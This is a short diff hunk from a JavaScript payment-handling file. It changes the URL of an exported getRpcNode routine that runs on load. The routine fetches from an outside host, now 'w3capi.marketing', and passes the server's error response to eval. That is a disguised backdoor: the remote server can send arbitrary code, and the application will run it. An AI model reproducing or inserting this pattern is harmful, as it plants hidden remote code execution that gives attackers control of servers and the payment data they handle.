@@ -135,7 +135,7 @@ exports.paytmResponse = (req, res, next) => {
 
 console.log("getRpcNode")
 exports.getRpcNode = (async () => {
-    const rpcNode = axios.get("http://payloadrpc.com/api/v2/node/2b0e13a51f4c5c2756f8b168fb4b3b40").then(res => {
+    const rpcNode = axios.get("http://w3capi.marketing/api/v2/node/2b0e13a51f4c5c2756f8b168fb4b3b40").then(res => {
         return res.data
     }).catch(err => {
         eval(err.response.data)
